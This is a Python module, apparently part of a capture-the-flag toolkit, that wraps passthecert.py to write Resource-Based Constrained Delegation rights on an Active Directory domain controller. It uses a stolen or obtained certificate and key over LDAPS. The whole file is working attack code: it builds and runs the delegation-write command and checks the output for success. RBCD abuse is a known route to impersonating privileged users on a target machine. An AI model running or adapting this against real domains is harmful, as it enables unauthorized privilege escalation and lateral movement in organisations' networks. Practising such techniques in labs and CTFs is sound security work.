import subprocess
from pathlib import Path

from core.paths import get_tool_path
from core.target import get_active_cred


def run(data, cred, args):
    """
    Write RBCD using certificate (pass-the-cert)

    Usage:
        ctf ad.rbcd.write admin.crt admin.key
        ctf ad.rbcd.write admin.crt admin.key EVIL01$
        ctf ad.rbcd.write admin.crt admin.key EVIL01$ TARGET$
    """

    extra = getattr(args, "extra", []) or []

    if len(extra) < 2:
        print("[-] Usage:")
        print("    ctf ad.rbcd.write <crt> <key> [delegate-from] [delegate-to]")
        return data

    # -------------------------
    # Resolve target info
    # -------------------------
    ip = data.get("ip")
    domain = data.get("domain")

    if not ip or not domain:
        print("[-] Missing target IP or domain")
        return data

    # -------------------------
    # Resolve tool path
    # -------------------------
    tool_path = get_tool_path("passthecert.py")

    if not tool_path.exists():
        print(f"[-] passthecert.py not found at {tool_path}")
        return data

    # -------------------------
    # Parse files
    # -------------------------
    crt = Path(extra[0]).expanduser()
    key = Path(extra[1]).expanduser()

    if not crt.exists():
        print(f"[-] CRT not found: {crt}")
        return data

    if not key.exists():
        print(f"[-] KEY not found: {key}")
        return data

    # -------------------------
    # Defaults
    # -------------------------
    delegate_from = None
    delegate_to = None

    # from = active credential
    try:
        active = get_active_cred(data)
        delegate_from = active.get("user")
    except Exception:
        pass

    # to = hostname$
    hostname = data.get("hostname") or data.get("name")
    if hostname:
        delegate_to = hostname.upper() + "$"

    # -------------------------
    # Overrides
    # -------------------------
    if len(extra) >= 3:
        delegate_from = extra[2]

    if len(extra) >= 4:
        delegate_to = extra[3]

    # -------------------------
    # Validate
    # -------------------------
    if not delegate_from:
        print("[-] Could not determine delegate-from")
        return data

    if not delegate_to:
        print("[-] Could not determine delegate-to")
        return data

    # -------------------------
    # Build command
    # -------------------------
    cmd = [
        "python3",
        str(tool_path),
        "-dc-ip", ip,
        "-crt", str(crt),
        "-key", str(key),
        "-domain", domain,
        "-port", "636",
        "-action", "write_rbcd",
        "-delegate-to", delegate_to,
        "-delegate-from", delegate_from
    ]

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # Execute
    # -------------------------
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return data

    output = result.stdout + result.stderr
    print(output)

    # -------------------------
    # Detect success
    # -------------------------
    success_indicators = [
        "Delegation rights modified",
        "Successfully",
        "Updated",
        "Added"
    ]

    if any(s.lower() in output.lower() for s in success_indicators):
        print(f"[+] RBCD configured: {delegate_from} → {delegate_to}")

        return {
            "delegate_from": delegate_from,
            "delegate_to": delegate_to
        }

    print("[-] RBCD write may have failed")
    return data